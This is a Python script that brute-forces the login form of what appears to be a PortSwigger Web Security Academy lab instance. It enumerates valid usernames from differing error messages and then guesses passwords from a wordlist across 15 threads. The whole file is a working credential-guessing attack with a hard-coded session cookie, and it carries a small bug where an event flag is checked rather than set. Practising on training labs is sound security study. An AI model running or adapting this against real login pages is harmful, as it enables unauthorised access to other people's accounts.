import time

import requests
import threading
from queue import Queue

server_name = "0a8600e203fb654181711b7700ca00a8"
url = f"https://{server_name}.web-security-academy.net/login"
headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "Cookie": "session=sk6eW5ywCK67udzOskguMbcGjPcVIXzy",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "25",
    "Origin": f"https://{server_name}.web-security-academy.net",
    "Referer": f"https://{server_name}.web-security-academy.net/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

found_username, found_password = '', ''
username_queue = Queue()
password_list = []

found = threading.Event()

def bruteForce():
    global found_username
    while not username_queue.empty():
        username = username_queue.get()
        data = f"username={username}&password=123"
        response = requests.post(url, headers=headers, data=data)
        print(f"[-] Testing Username: {username}")
        if not b"Invalid username" in response.content:
            print(f"[*] Username Found: {username}")
            found.is_set()
            for password in password_list:
                print(f"[-] Testing Password: {username}:{password}")
                data = f"username={username}&password={password}"
                response = requests.post(url, headers=headers, data=data)
                if not b"Incorrect password" in response.content:
                    time.sleep(2)
                    print(f"[*] Username & Password Found: {username}:{password}")
                    break


def main():
    # Put the usernames in a Queue
    with open('../../credentials/usernames.txt', 'r') as file:
        for line in file:
            username_queue.put(line.strip('\n'))

    # Put the passwords in a Queue
    with open('../../credentials/passwords.txt', 'r') as file:
        for line in file:
            password_list.append(line.strip('\n'))

    num_of_threads = 15
    threads = []
    for _ in range(num_of_threads):
        t = threading.Thread(target=bruteForce)
        t.start()
        threads.append(t)



if __name__ == "__main__":
    main()


